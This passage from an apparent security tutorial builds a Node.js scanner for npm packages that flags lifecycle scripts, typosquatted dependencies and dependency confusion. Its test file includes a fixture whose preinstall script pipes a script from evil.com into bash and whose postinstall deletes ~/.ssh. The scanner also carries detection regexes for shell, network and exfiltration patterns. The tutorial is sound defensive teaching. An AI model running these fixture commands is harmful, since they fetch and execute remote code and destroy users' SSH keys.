        try {
            // 1. Load package.json
            spinner.text = 'Loading package.json...';
            if (!this.loadPackage(packagePath)) {
                spinner.fail('Failed to load package.json');
                return;
            }
            
            // 2. Analyze scripts
            spinner.text = 'Analyzing scripts...';
            this.analyzeScripts();
            
            // 3. Analyze dependencies
            spinner.text = 'Analyzing dependencies...';
            this.analyzeDependencies();
            
            // 4. Check for supply chain risks
            spinner.text = 'Checking for supply chain risks...';
            this.checkSupplyChainRisks();
            
            // 5. Calculate risk score
            spinner.text = 'Calculating risk score...';
            this.calculateRiskScore();
            
            // 6. Generate report
            spinner.text = 'Generating report...';
            this.generateReport();
            
            spinner.succeed(chalk.green('Scan complete!'));
            
        } catch (error) {
            spinner.fail(chalk.red(`Scan failed: ${error.message}`));
            throw error;
        }
    }

    /**
     * Load package.json
     */
    loadPackage(packagePath) {
        try {
            const content = fs.readFileSync(packagePath, 'utf8');
            this.packageData = JSON.parse(content);
            
            this.results.packageInfo = {
                name: this.packageData.name || 'unknown',
                version: this.packageData.version || '0.0.0',
                description: this.packageData.description || '',
                private: this.packageData.private || false,
                license: this.packageData.license || null,
                author: this.packageData.author || null
            };
            
            if (this.options.verbose) {
                console.log(chalk.gray(`📦 Package: ${this.results.packageInfo.name}@${this.results.packageInfo.version}`));
            }
            
            return true;
        } catch (error) {
            console.error(chalk.red(`❌ Error loading package: ${error.message}`));
            return false;
        }
    }

    /**
     * Analyze scripts
     */
    analyzeScripts() {
        const scripts = this.packageData.scripts || {};
        const scriptNames = Object.keys(scripts);
        
        if (scriptNames.length === 0) {
            if (this.options.verbose) {
                console.log(chalk.gray('No scripts found'));
            }
            return;
        }
        
        // Define detection patterns
        const patterns = [
            // Shell execution
            {
                id: 'SHELL_001',
                name: 'Shell Command Execution',
                severity: 'CRITICAL',
                patterns: [/exec\s*\(/, /spawn\s*\(/, /child_process/, /bash/, /sh\s+-c/],
                description: 'Executes shell commands'
            },
            // Network access
            {
                id: 'NET_001',
                name: 'Network Communication',
                severity: 'HIGH',
                patterns: [/http\./, /https\./, /axios/, /fetch/, /curl/, /wget/],
                description: 'Makes network connections'
            },
            // Filesystem access
            {
                id: 'FS_001',
                name: 'Filesystem Operations',
                severity: 'HIGH',
                patterns: [/fs\./, /readFile/, /writeFile/, /mkdir/, /rm/, /unlink/],
                description: 'Accesses the filesystem'
            },
            // Environment access
            {
                id: 'ENV_001',
                name: 'Environment Variable Access',
                severity: 'MEDIUM',
                patterns: [/process\.env/, /env\./, /environment/],
                description: 'Reads environment variables'
            },
            // Dynamic code
            {
                id: 'DYN_001',
                name: 'Dynamic Code Execution',
                severity: 'CRITICAL',
                patterns: [/eval\s*\(/, /new Function/, /vm\./, /Function\s*\(/],
                description: 'Executes dynamic code'
            },
            // Persistence
            {
                id: 'PER_001',
                name: 'Persistence Mechanism',
                severity: 'HIGH',
                patterns: [/cron/, /startup/, /service/, /systemd/, /launchd/],
                description: 'Installs persistence mechanisms'
            },
            // Data exfiltration
            {
                id: 'EXF_001',
                name: 'Data Exfiltration',
                severity: 'CRITICAL',
                patterns: [/exfil/, /steal/, /collect/, /send.*data/],
                description: 'May exfiltrate data'
            }
        ];

        // Check each script
        for (const [name, command] of Object.entries(scripts)) {
            let findings = [];
            
            for (const pattern of patterns) {
                for (const regex of pattern.patterns) {
                    if (regex.test(command)) {
                        findings.push({
                            id: pattern.id,
                            name: pattern.name,
                            severity: pattern.severity,
                            description: pattern.description,
                            pattern: regex.toString(),
                            command: command
                        });
                        break;
                    }
                }
            }
            
            if (findings.length > 0) {
                this.results.findings.push({
                    type: 'script',
                    name: name,
                    command: command,
                    findings: findings
                });
                
                // Track by severity
                for (const finding of findings) {
                    this.results.summary[finding.severity.toLowerCase()] = 
                        (this.results.summary[finding.severity.toLowerCase()] || 0) + 1;
                }
            }
            
            // Check for lifecycle scripts
            const lifecycleScripts = ['preinstall', 'install', 'postinstall', 'prepare'];
            if (lifecycleScripts.includes(name)) {
                this.results.findings.push({
                    type: 'lifecycle',
                    name: name,
                    command: command,
                    severity: 'HIGH',
                    description: `Lifecycle script "${name}" executes during installation`
                });
                
                this.results.summary.high = (this.results.summary.high || 0) + 1;
            }
        }
        
        this.results.scripts = Object.entries(scripts).map(([name, command]) => ({
            name,
            command
        }));
        
        if (this.options.verbose) {
            console.log(chalk.gray(`📋 Scripts analyzed: ${scriptNames.length}`));
        }
    }

    /**
     * Analyze dependencies
     */
    analyzeDependencies() {
        const dependencies = {
            ...this.packageData.dependencies,
            ...this.packageData.devDependencies,
            ...this.packageData.peerDependencies
        };
        
        const depNames = Object.keys(dependencies);
        
        if (depNames.length === 0) {
            if (this.options.verbose) {
                console.log(chalk.gray('No dependencies found'));
            }
            return;
        }
        
        this.results.dependencies = depNames.map(name => ({
            name,
            version: dependencies[name],
            type: this.getDependencyType(name)
        }));
        
        // Check for suspicious dependencies
        const suspiciousDeps = [];
        const typosquattingList = {
            'exprees': 'express',
            'loash': 'lodash',
            'reactt': 'react',
            'anglar': 'angular',
            'vuee': 'vue',
            'axois': 'axios'
        };
        
        for (const [name, version] of Object.entries(dependencies)) {
            if (typosquattingList[name]) {
                suspiciousDeps.push({
                    name,
                    version,
                    resembles: typosquattingList[name],
                    type: 'typosquatting'
                });
            }
        }
        
        if (suspiciousDeps.length > 0) {
            this.results.findings.push({
                type: 'typosquatting',
                dependencies: suspiciousDeps,
                severity: 'CRITICAL',
                description: 'Typosquatting dependencies detected'
            });
            
            this.results.summary.critical = (this.results.summary.critical || 0) + suspiciousDeps.length;
        }
        
        // Check for dependency confusion
        const isPrivate = this.packageData.private === true;
        const unscopedDeps = depNames.filter(name => !name.startsWith('@'));
        
        if (isPrivate && unscopedDeps.length > 0) {
            this.results.findings.push({
                type: 'dependency_confusion',
                dependencies: unscopedDeps,
                severity: 'HIGH',
                description: 'Private package with unscoped dependencies'
            });
            
            this.results.summary.high = (this.results.summary.high || 0) + 1;
        }
        
        if (this.options.verbose) {
            console.log(chalk.gray(`📦 Dependencies found: ${depNames.length}`));
        }
    }

    /**
     * Get dependency type
     */
    getDependencyType(name) {
        if (this.packageData.dependencies && this.packageData.dependencies[name]) {
            return 'production';
        }
        if (this.packageData.devDependencies && this.packageData.devDependencies[name]) {
            return 'development';
        }
        if (this.packageData.peerDependencies && this.packageData.peerDependencies[name]) {
            return 'peer';
        }
        return 'unknown';
    }

    /**
     * Check for supply chain risks
     */
    checkSupplyChainRisks() {
        // Check package name for typosquatting
        const name = this.packageData.name || '';
        const popularPackages = ['express', 'react', 'vue', 'angular', 'lodash', 'axios'];
        
        for (const popular of popularPackages) {
            const similarity = this.calculateSimilarity(name.toLowerCase(), popular.toLowerCase());
            if (similarity > 0.7 && similarity < 1.0) {
                this.results.findings.push({
                    type: 'typosquatting_name',
                    name: name,
                    resembles: popular,
                    similarity: similarity,
                    severity: 'HIGH',
                    description: `Package name resembles "${popular}" (${Math.round(similarity * 100)}% similar)`
                });
                
                this.results.summary.high = (this.results.summary.high || 0) + 1;
                break;
            }
        }
        
        // Check for suspicious version
        const version = this.packageData.version || '0.0.0';
        if (version.includes('999') || version.includes('9999')) {
            this.results.findings.push({
                type: 'suspicious_version',
                version: version,
                severity: 'HIGH',
                description: 'Suspicious version number detected'
            });
            
            this.results.summary.high = (this.results.summary.high || 0) + 1;
        }
    }

    /**
     * Calculate similarity between two strings
     */
    calculateSimilarity(str1, str2) {
        const longer = str1.length > str2.length ? str1 : str2;
        const shorter = str1.length > str2.length ? str2 : str1;
        
        if (longer.length === 0) return 1.0;
        
        const costs = [];
        for (let i = 0; i <= shorter.length; i++) {
            costs[i] = i;
        }
        
        for (let i = 1; i <= longer.length; i++) {
            let lastValue = i;
            for (let j = 1; j <= shorter.length; j++) {
                const newValue = Math.min(
                    costs[j] + 1,
                    lastValue + 1,
                    costs[j - 1] + (longer[i - 1] === shorter[j - 1] ? 0 : 1)
                );
                costs[j - 1] = lastValue;
                lastValue = newValue;
            }
            costs[shorter.length] = lastValue;
        }
        
        const distance = costs[shorter.length];
        return 1 - (distance / longer.length);
    }

    /**
     * Calculate risk score
     */
    calculateRiskScore() {
        const severityWeights = {
            CRITICAL: 25,
            HIGH: 15,
            MEDIUM: 8,
            LOW: 3,
            INFO: 0
        };
        
        let score = 0;
        
        for (const [severity, count] of Object.entries(this.results.summary)) {
            const weight = severityWeights[severity.toUpperCase()] || 0;
            score += count * weight;
        }
        
        this.results.riskScore = Math.min(score, 100);
        
        if (this.results.riskScore >= 80) {
            this.results.riskLevel = 'CRITICAL';
        } else if (this.results.riskScore >= 60) {
            this.results.riskLevel = 'HIGH';
        } else if (this.results.riskScore >= 40) {
            this.results.riskLevel = 'MEDIUM';
        } else if (this.results.riskScore >= 20) {
            this.results.riskLevel = 'LOW';
        } else {
            this.results.riskLevel = 'INFO';
        }
    }

    /**
     * Generate report
     */
    generateReport() {
        console.log(chalk.bold.cyan('\n' + '='.repeat(60)));
        console.log(chalk.bold.cyan('🔒 SECURITY SCAN REPORT'));
        console.log(chalk.cyan('='.repeat(60)) + '\n');
        
        // Package info
        console.log(chalk.bold('📦 Package Information:'));
        console.log(`   Name: ${this.results.packageInfo.name}`);
        console.log(`   Version: ${this.results.packageInfo.version}`);
        console.log(`   License: ${this.results.packageInfo.license || 'None'}`);
        console.log(`   Private: ${this.results.packageInfo.private}`);
        console.log('');
        
        // Summary
        console.log(chalk.bold('📊 Summary:'));
        const summaryTable = new Table({
            head: ['Severity', 'Count'],
            colWidths: [15, 10]
        });
        
        summaryTable.push(
            ['CRITICAL', this.results.summary.critical || 0],
            ['HIGH', this.results.summary.high || 0],
            ['MEDIUM', this.results.summary.medium || 0],
            ['LOW', this.results.summary.low || 0],
            ['INFO', this.results.summary.info || 0]
        );
        console.log(summaryTable.toString());
        console.log('');
        
        // Risk score
        const riskColor = {
            CRITICAL: chalk.red.bold,
            HIGH: chalk.yellow.bold,
            MEDIUM: chalk.yellow,
            LOW: chalk.green,
            INFO: chalk.gray
        };
        
        console.log(chalk.bold('🎯 Risk Assessment:'));
        console.log(`   Score: ${this.results.riskScore}/100`);
        console.log(`   Level: ${riskColor[this.results.riskLevel](this.results.riskLevel)}`);
        console.log('');
        
        // Findings
        if (this.results.findings.length > 0) {
            console.log(chalk.bold('⚠️ Findings:'));
            
            for (const finding of this.results.findings) {
                const severityColor = {
                    CRITICAL: chalk.red.bold,
                    HIGH: chalk.yellow.bold,
                    MEDIUM: chalk.yellow,
                    LOW: chalk.green,
                    INFO: chalk.gray
                };
                
                if (finding.type === 'script') {
                    console.log(`\n  📜 ${finding.name}: ${finding.command}`);
                    for (const subFinding of finding.findings) {
                        console.log(`    ${severityColor[subFinding.severity](`[${subFinding.severity}]`)} ${subFinding.name}`);
                        console.log(`      ${subFinding.description}`);
                    }
                } else if (finding.type === 'lifecycle') {
                    console.log(`\n  🔄 [${severityColor[finding.severity](finding.severity)}] Lifecycle Script: ${finding.name}`);
                    console.log(`      ${finding.description}`);
                } else if (finding.type === 'typosquatting') {
                    console.log(`\n  📦 [${severityColor.CRITICAL('CRITICAL')}] Typosquatting Dependencies:`);
                    for (const dep of finding.dependencies) {
                        console.log(`      ${dep.name} → resembles ${dep.resembles}`);
                    }
                } else {
                    console.log(`\n  ⚠️ [${severityColor[finding.severity]?.(finding.severity) || finding.severity}] ${finding.type}`);
                    console.log(`      ${finding.description}`);
                }
            }
            
            console.log('');
        } else {
            console.log(chalk.green('✅ No security issues detected'));
            console.log('');
        }
        
        // Recommendations
        console.log(chalk.bold('💡 Recommendations:'));
        
        if (this.results.riskLevel === 'CRITICAL') {
            console.log(chalk.red.bold('  🚨 CRITICAL: DO NOT INSTALL THIS PACKAGE!'));
            console.log(chalk.red('  This package poses an immediate security threat.'));
        } else if (this.results.riskLevel === 'HIGH') {
            console.log(chalk.yellow.bold('  ⚠️ HIGH: Review this package carefully.'));
            console.log(chalk.yellow('  Consider using an alternative package.'));
        } else if (this.results.riskLevel === 'MEDIUM') {
            console.log(chalk.yellow('  📋 MEDIUM: Exercise caution with this package.'));
            console.log(chalk.yellow('  Review the suspicious findings above.'));
        } else {
            console.log(chalk.green('  ✅ LOW: This package appears safe.'));
            console.log(chalk.green('  Standard review recommended.'));
        }
        
        console.log('\n' + chalk.cyan('='.repeat(60)));
        
        // CI/CD output
        if (this.options.ciMode) {
            this.outputCIMode();
        }
        
        // JSON output
        if (this.options.jsonOutput) {
            this.outputJSON();
        }
    }

    /**
     * Output CI/CD mode
     */
    outputCIMode() {
        const exitCode = this.results.riskLevel === 'CRITICAL' ? 1 :
                         this.results.riskLevel === 'HIGH' ? 2 : 0;
        
        console.log(chalk.gray(`\n🔧 CI Mode: Exit Code ${exitCode}`));
        
        if (exitCode !== 0) {
            console.log(chalk.red(`❌ Security scan failed - exiting with code ${exitCode}`));
            process.exit(exitCode);
        }
    }

    /**
     * Output JSON
     */
    outputJSON() {
        const jsonOutput = JSON.stringify(this.results, null, 2);
        const outputPath = path.join(process.cwd(), 'scan-results.json');
        fs.writeFileSync(outputPath, jsonOutput);
        console.log(chalk.gray(`\n📄 JSON output saved to: ${outputPath}`));
    }
}

// Export for use in other files
module.exports = SecurityScanner;

// Run if executed directly
if (require.main === module) {
    const args = process.argv.slice(2);
    const options = {
        verbose: args.includes('--verbose') || args.includes('-v'),
        jsonOutput: args.includes('--json'),
        ciMode: args.includes('--ci')
    };
    
    const packagePath = args.find(arg => !arg.startsWith('--')) || 'package.json';
    
    const scanner = new SecurityScanner(options);
    scanner.scan(packagePath);
}
```

#### Step 2: Create CI/CD Integration

**📁 File:** `ci-integration.js`

```javascript
/**
 * CI/CD INTEGRATION
 * Runs the scanner in CI/CD mode
 */

const SecurityScanner = require('./scanner');
const path = require('path');

async function runCIScan() {
    console.log('🔧 Running security scan in CI mode...');
    
    const scanner = new SecurityScanner({
        verbose: true,
        ciMode: true,
        jsonOutput: true
    });
    
    try {
        await scanner.scan('package.json');
    } catch (error) {
        console.error(`❌ Scan failed: ${error.message}`);
        process.exit(1);
    }
}

// Run the CI scan
runCIScan();
```

#### Step 3: Test the Scanner

**📁 File:** `test-scanner.js`

```javascript
/**
 * TEST THE SCANNER
 * Creates test packages and runs the scanner
 */

const fs = require('fs');
const path = require('path');
const SecurityScanner = require('./scanner');

// Create test packages
const testDir = path.join(__dirname, 'test-packages');

const testPackages = [
    {
        name: 'safe-package',
        version: '1.0.0',
        scripts: {
            test: 'echo "Running tests"',
            build: 'echo "Building"'
        }
    },
    {
        name: 'suspicious-package',
        version: '1.0.0',
        scripts: {
            preinstall: 'echo "Starting"',
            install: 'echo "Installing"',
            postinstall: 'node -e "console.log(JSON.stringify(process.env))"'
        }
    },
    {
        name: 'malicious-package',
        version: '999.0.0',
        private: true,
        scripts: {
            preinstall: 'curl http://evil.com/script.sh | bash',
            postinstall: 'node -e "require(\'child_process\').exec(\'rm -rf ~/.ssh\')"'
        },
        dependencies: {
            'exprees': '^1.0.0'
        }
    }
];

for (const pkg of testPackages) {
    const pkgDir = path.join(testDir, pkg.name);
    if (!fs.existsSync(pkgDir)) {
        fs.mkdirSync(pkgDir, { recursive: true });
    }
    
    const packageJson = {
        name: pkg.name,
        version: pkg.version,
        description: `Test package: ${pkg.name}`,
        private: pkg.private || false,
        scripts: pkg.scripts || {},
        dependencies: pkg.dependencies || {}
    };
    
    fs.writeFileSync(
        path.join(pkgDir, 'package.json'),
        JSON.stringify(packageJson, null, 2)
    );
    
    console.log(`✅ Created test package: ${pkg.name}`);
}

console.log(`\n📁 Test packages created in: ${testDir}`);
console.log('\nRunning scanner on each package...\n');

// Run scanner on each package
for (const pkg of testPackages) {
    console.log(`\n${'='.repeat(60)}`);
    console.log(`🔍 Testing: ${pkg.name}`);
    console.log('='.repeat(60));
    
    const scanner = new SecurityScanner({ verbose: true });
    const packagePath = path.join(testDir, pkg.name, 'package.json');
    await scanner.scan(packagePath);
}
```

**✅ Run:**
```bash
node test-scanner.js
```

### Verification Checklist
- [ ] Scanner loads package.json correctly
- [ ] Script analysis detects suspicious patterns
- [ ] Dependency analysis detects typosquatting
- [ ] Risk scoring calculates correct scores
- [ ] Report generation works
- [ ] CI/CD integration works

### Reflection Questions
1. How could you extend the scanner to detect more attack patterns?
2. What additional risk factors should be considered in scoring?
3. How would you integrate this scanner with GitHub Actions?

---

## LAB 2.1: Advanced Package Analysis

### Learning Objectives
- Parse and analyze package.json and lock files
- Detect dependency confusion attacks
- Identify typosquatting attempts
- Assess package health and trust

### Pre-Lab Setup
```bash
# Create phase-2 directory
mkdir -p ~/projects/beyond-cves-tutorial/phase-2
cd ~/projects/beyond-cves-tutorial/phase-2

# Initialize package.json
npm init -y

# Install dependencies
npm install --save-dev axios chalk ora cli-table3
```

### Lab Steps

#### Step 1: Create Package Analyzer

**📁 File:** `src/package-analyzer.js`

```javascript
/**
 * ADVANCED PACKAGE ANALYZER
 * Deep analysis of package.json and lock files
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

class PackageAnalyzer {
    constructor(packagePath) {
        this.packagePath = packagePath;
        this.packageDir = path.dirname(packagePath);
        this.packageJson = null;
        this.lockFile = null;
        this.results = {
            packageInfo: null,
            dependencies: [],
            devDependencies: [],
            peerDependencies: [],
            analysis: {
                typosquatting: [],
                dependencyConfusion: [],
                healthScore: 0,
                trustScore: 0,
                riskFactors: []
            }
        };
    }

    /**
     * Analyze the package
     */
    async analyze() {
        // 1. Load package.json
        this.loadPackageJson();
        
        // 2. Load lock file
        this.loadLockFile();
        
        // 3. Analyze dependencies
        this.analyzeDependencies();
        
        // 4. Detect typosquatting
        this.detectTyposquatting();
        
        // 5. Detect dependency confusion
        this.detectDependencyConfusion();
        
        // 6. Calculate health score
        this.calculateHealthScore();
        
        // 7. Calculate trust score
        this.calculateTrustScore();
        
        return this.results;
    }

    /**
     * Load package.json
     */
    loadPackageJson() {
        try {
            const content = fs.readFileSync(this.packagePath, 'utf8');
            this.packageJson = JSON.parse(content);
            
            this.results.packageInfo = {
                name: this.packageJson.name || 'unknown',
                version: this.packageJson.version || '0.0.0',
                description: this.packageJson.description || '',
                author: this.packageJson.author || null,
                license: this.packageJson.license || null,
                repository: this.packageJson.repository || null,
                homepage: this.packageJson.homepage || null,
                private: this.packageJson.private || false,
                scripts: this.packageJson.scripts || {},
                publishConfig: this.packageJson.publishConfig || {}
            };
            
            console.log(`📦 Loaded: ${this.results.packageInfo.name}@${this.results.packageInfo.version}`);
        } catch (error) {
            throw new Error(`Failed to load package.json: ${error.message}`);
        }
    }

    /**
     * Load lock file
     */
    loadLockFile() {
        const lockFiles = ['package-lock.json', 'npm-shrinkwrap.json', 'yarn.lock'];
        
        for (const lockFile of lockFiles) {
            const lockPath = path.join(this.packageDir, lockFile);
            if (fs.existsSync(lockPath)) {
                try {
                    const content = fs.readFileSync(lockPath, 'utf8');
                    
                    if (lockFile.endsWith('.json')) {
                        this.lockFile = JSON.parse(content);
                    } else {
                        // Yarn.lock - simplified parsing
                        this.lockFile = this.parseYarnLock(content);
                    }
                    
                    console.log(`🔒 Lock file found: ${lockFile}`);
                    return;
                } catch (error) {
                    console.warn(`⚠️ Could not parse ${lockFile}: ${error.message}`);
                }
            }
        }
        
        console.log('⚠️ No lock file found');
        this.results.analysis.riskFactors.push({
            type: 'Missing Lock File',
            severity: 'MEDIUM',
            description: 'No lock file found, installation may be non-deterministic'
        });
    }

    /**
     * Parse Yarn.lock
     */
    parseYarnLock(content) {
        const packages = {};
        const lines = content.split('\n');
        let currentPackage = null;
        
        for (const line of lines) {
            const trimmed = line.trim();
            if (!trimmed) continue;
            
            const match = trimmed.match(/^"([^"]+)"@([^:]+):/);
            if (match) {
                currentPackage = {
                    name: match[1],
                    version: match[2]
                };
                continue;
            }
            
            if (currentPackage && trimmed.startsWith('resolved')) {
                currentPackage.resolved = trimmed.split(' ')[1]?.replace(/"/g, '');
                packages[currentPackage.name] = currentPackage;
                currentPackage = null;
            }
        }
        
        return { packages };
    }

    /**
     * Analyze dependencies
     */
    analyzeDependencies() {
        const dependencies = {
            ...this.packageJson.dependencies,
            ...this.packageJson.devDependencies,
            ...this.packageJson.peerDependencies
        };
        
        const depNames = Object.keys(dependencies);
        
        console.log(`📊 Analyzing ${depNames.length} dependencies...`);
        
        // Check for suspicious version ranges
        const suspiciousVersions = ['*', 'latest', '^0.0.0', '>999.0.0'];
        
        for (const [name, version] of Object.entries(dependencies)) {
            const dep = {
                name,
                version,
                type: this.getDependencyType(name),
                suspicious: false
            };
            
            // Check for suspicious version
            if (suspiciousVersions.includes(version) || version.includes('999')) {
                dep.suspicious = true;
                this.results.analysis.riskFactors.push({
                    type: 'Suspicious Version',
                    severity: 'HIGH',
                    description: `Dependency "${name}" has suspicious version "${version}"`
                });
            }
            
            if (this.packageJson.dependencies && this.packageJson.dependencies[name]) {
                this.results.dependencies.push(dep);
            } else if (this.packageJson.devDependencies && this.packageJson.devDependencies[name]) {
                this.results.devDependencies.push(dep);
            } else if (this.packageJson.peerDependencies && this.packageJson.peerDependencies[name]) {
                this.results.peerDependencies.push(dep);
            }
        }
    }

    /**
     * Get dependency type
     */
    getDependencyType(name) {
        if (this.packageJson.dependencies && this.packageJson.dependencies[name]) {
            return 'production';
        }
        if (this.packageJson.devDependencies && this.packageJson.devDependencies[name]) {
            return 'development';
        }
        if (this.packageJson.peerDependencies && this.packageJson.peerDependencies[name]) {
            return 'peer';
        }
        return 'unknown';
    }

    /**
     * Detect typosquatting
     */
    detectTyposquatting() {
        const popularPackages = [
            'express', 'react', 'vue', 'angular', 'lodash', 'axios',
            'typescript', 'webpack', 'babel', 'eslint', 'prettier',
            'jest', 'mocha', 'chai', 'sinon', 'cypress', 'puppeteer'
        ];
        
        const allDeps = [
            ...this.results.dependencies,
            ...this.results.devDependencies,
            ...this.results.peerDependencies
        ];
        
        const packageName = this.results.packageInfo.name;
        
        // Check the package itself
        this.checkTyposquattingCandidate(packageName, popularPackages);
        
        // Check dependencies
        for (const dep of allDeps) {
            this.checkTyposquattingCandidate(dep.name, popularPackages);
        }
    }

    /**
     * Check a single package for typosquatting
     */
    checkTyposquattingCandidate(name, popularPackages) {
        if (!name) return;
        
        const lowerName = name.toLowerCase();
        
        for (const popular of popularPackages) {
            const lowerPopular = popular.toLowerCase();
            
            if (lowerName === lowerPopular) continue;
            
            const similarity = this.calculateSimilarity(lowerName, lowerPopular);
            
            if (similarity > 0.7) {
                this.results.analysis.typosquatting.push({
                    package: name,
                    resembles: popular,
                    similarity: similarity,
                    risk: similarity > 0.9 ? 'HIGH' : 'MEDIUM'
                });
                
                if (similarity > 0.9) {
                    this.results.analysis.riskFactors.push({
                        type: 'Typosquatting',
                        severity: 'CRITICAL',
                        description: `Package "${name}" is ${Math.round(similarity * 100)}% similar to "${popular}"`
                    });
                }
                
                break;
            }
        }
    }

    /**
     * Calculate similarity between strings
     */
    calculateSimilarity(str1, str2) {
        const longer = str1.length > str2.length ? str1 : str2;
        const shorter = str1.length > str2.length ? str2 : str1;
        
        if (longer.length === 0) return 1.0;
        
        const costs = [];
        for (let i = 0; i <= shorter.length; i++) {
            costs[i] = i;
        }
        
        for (let i = 1; i <= longer.length; i++) {
            let lastValue = i;
            for (let j = 1; j <= shorter.length; j++) {
                const newValue = Math.min(
                    costs[j] + 1,
                    lastValue + 1,
                    costs[j - 1] + (longer[i - 1] === shorter[j - 1] ? 0 : 1)
                );
                costs[j - 1] = lastValue;
                lastValue = newValue;
            }
            costs[shorter.length] = lastValue;
        }
        
        const distance = costs[shorter.length];
        return 1 - (distance / longer.length);
    }

    /**
     * Detect dependency confusion
     */
    detectDependencyConfusion() {
        const isPrivate = this.results.packageInfo.private;
        const hasUnscopedDeps = this.results.dependencies.some(d => !d.name.startsWith('@'));
        
        if (isPrivate && hasUnscopedDeps) {
            const unscoped = this.results.dependencies
                .filter(d => !d.name.startsWith('@'))
                .map(d => d.name);
            
            this.results.analysis.dependencyConfusion.push({
                type: 'HIGH_RISK',
                description: `Private package uses ${unscoped.length} unscoped dependencies`,
                dependencies: unscoped
            });
            
            this.results.analysis.riskFactors.push({
                type: 'Dependency Confusion',
                severity: 'HIGH',
                description: `Private package uses unscoped dependencies: ${unscoped.join(', ')}`
            });
        }
    }

    /**
     * Calculate health score
     */
    calculateHealthScore() {
        let score = 100;
        const issues = [];
        
        // Check for missing license
        if (!this.results.packageInfo.license) {
            score -= 10;
            issues.push('Missing license');
        }
        
        // Check for missing repository
        if (!this.results.packageInfo.repository) {
            score -= 10;
            issues.push('Missing repository');
        }
        
        // Check for missing homepage
        if (!this.results.packageInfo.homepage) {
            score -= 5;
            issues.push('Missing homepage');
        }
        
        // Check for lock file
        if (!this.lockFile) {
            score -= 15;
            issues.push('Missing lock file');
        }
        
        // Check for suspicious scripts
        const scripts = Object.keys(this.results.packageInfo.scripts || {});
        const suspiciousScripts = ['preinstall', 'install', 'postinstall', 'prepare'];
        const foundSuspicious = scripts.filter(s => suspiciousScripts.includes(s));
        
        if (foundSuspicious.length > 0) {
            score -= foundSuspicious.length * 5;
            issues.push(`Lifecycle scripts: ${foundSuspicious.join(', ')}`);
        }
        
        // Check for large dependency count
        const totalDeps = this.results.dependencies.length + this.results.devDependencies.length;
        if (totalDeps > 50) {
            score -= 10;
            issues.push(`Large dependency count: ${totalDeps}`);
        }
        
        // Check for typosquatting
        if (this.results.analysis.typosquatting.length > 0) {
            score -= 20;
            issues.push(`Typosquatting detected`);
        }
        
        // Check for dependency confusion
        if (this.results.analysis.dependencyConfusion.length > 0) {
            score -= 20;
            issues.push(`Dependency confusion risk`);
        }
        
        this.results.analysis.healthScore = Math.max(0, Math.min(100, score));
        
        if (issues.length > 0) {
            this.results.analysis.riskFactors.push({
                type: 'Health Issues',
                severity: 'MEDIUM',
                description: issues.join('; ')
            });
        }
        
        console.log(`📊 Health Score: ${this.results.analysis.healthScore}/100`);
    }

    /**
     * Calculate trust score
     */
    calculateTrustScore() {
        let score = 100;
        
        // Deduct for risk factors
        for (const factor of this.results.analysis.riskFactors) {
            const deductions = {
                CRITICAL: 25,
                HIGH: 15,
                MEDIUM: 8,
                LOW: 3
            };
            score -= deductions[factor.severity] || 0;
        }
        
        // Deduct for typosquatting
        for (const ts of this.results.analysis.typosquatting) {
            score -= ts.risk === 'HIGH' ? 25 : 15;
        }
        
        // Deduct for dependency confusion
        for (const dc of this.results.analysis.dependencyConfusion) {
            score -= dc.type === 'HIGH_RISK' ? 25 : 15;
        }
        
        // Add for good practices
        if (this.results.packageInfo.license) score += 5;
        if (this.results.packageInfo.repository) score += 5;
        if (this.lockFile) score += 5;
        if (this.results.analysis.healthScore > 80) score += 5;
        
        this.results.analysis.trustScore = Math.max(0, Math.min(100, score));
        
        console.log(`🔒 Trust Score: ${this.results.analysis.trustScore}/100`);
    }

    /**
     * Generate report
     */
    generateReport() {
        const chalk = require('chalk');
        const Table = require('cli-table3');
        
        console.log(chalk.bold.cyan('\n' + '='.repeat(60)));
        console.log(chalk.bold.cyan('📊 PACKAGE ANALYSIS REPORT'));
        console.log(chalk.cyan('='.repeat(60)) + '\n');
        
        // Package info
        console.log(chalk.bold('📦 Package:'), this.results.packageInfo.name);
        console.log(chalk.bold('📌 Version:'), this.results.packageInfo.version);
        console.log(chalk.bold('📋 License:'), this.results.packageInfo.license || 'None');
        console.log(chalk.bold('🔒 Private:'), this.results.packageInfo.private);
        console.log('');
        
        // Dependency stats
        console.log(chalk.bold('📊 Dependencies:'));
        console.log(`   Production: ${this.results.dependencies.length}`);
        console.log(`   Development: ${this.results.devDependencies.length}`);
        console.log(`   Peer: ${this.results.peerDependencies.length}`);
        console.log('');
        
        // Scores
        const trustColor = this.results.analysis.trustScore >= 80 ? chalk.green :
                           this.results.analysis.trustScore >= 60 ? chalk.yellow :
                           chalk.red;
        
        const healthColor = this.results.analysis.healthScore >= 80 ? chalk.green :
                            this.results.analysis.healthScore >= 60 ? chalk.yellow :
                            chalk.red;
        
        console.log(chalk.bold('🎯 Scores:'));
        console.log(`   Trust: ${trustColor(`${this.results.analysis.trustScore}/100`)}`);
        console.log(`   Health: ${healthColor(`${this.results.analysis.healthScore}/100`)}`);
        console.log('');
        
        // Risk factors
        if (this.results.analysis.riskFactors.length > 0) {
            console.log(chalk.yellow.bold('⚠️ Risk Factors:'));
            for (const factor of this.results.analysis.riskFactors) {
                const color = factor.severity === 'CRITICAL' ? chalk.red.bold :
                             factor.severity === 'HIGH' ? chalk.yellow.bold :
                             chalk.yellow;
                console.log(`   ${color(`[${factor.severity}]`)} ${factor.type}`);
                console.log(`      ${factor.description}`);
            }
            console.log('');
        }
        
        // Typosquatting
        if (this.results.analysis.typosquatting.length > 0) {
            console.log(chalk.yellow.bold('🔍 Typosquatting Detections:'));
            for (const ts of this.results.analysis.typosquatting) {
                console.log(`   ${ts.package} → resembles ${ts.resembles}`);
                console.log(`      Similarity: ${Math.round(ts.similarity * 100)}%`);
                console.log(`      Risk: ${ts.risk}`);
            }
            console.log('');
        }
        
        // Dependency confusion
        if (this.results.analysis.dependencyConfusion.length > 0) {
            console.log(chalk.yellow.bold('🔄 Dependency Confusion:'));
            for (const dc of this.results.analysis.dependencyConfusion) {
                console.log(`   ${dc.type}: ${dc.description}`);
                if (dc.dependencies) {
                    console.log(`      Packages: ${dc.dependencies.join(', ')}`);
                }
            }
            console.log('');
        }
        
        console.log(chalk.cyan('='.repeat(60)));
    }
}

// Export for use in other files
module.exports = PackageAnalyzer;

// Run if executed directly
if (require.main === module) {
    const analyzer = new PackageAnalyzer(process.argv[2] || 'package.json');
    await analyzer.analyze();
    analyzer.generateReport();
}
```

#### Step 2: Run the Analyzer

**✅ Run:**
```bash
node src/package-analyzer.js ../phase-1/test-packages/malicious/package.json
```

### Verification Checklist
